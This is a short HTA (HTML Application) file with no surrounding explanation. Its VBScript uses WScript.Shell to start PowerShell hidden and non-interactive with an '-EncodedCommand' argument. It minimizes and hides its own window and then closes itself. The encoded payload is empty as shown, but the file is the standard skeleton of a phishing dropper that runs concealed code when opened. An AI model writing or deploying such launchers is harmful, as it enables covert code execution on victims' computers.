<html>
<head>
<HTA:APPLICATION ID="App" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize" />
<script language="VBScript">
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -nop -w hidden -EncodedCommand ", 0, False
self.close
</script>
</head>
<body></body>
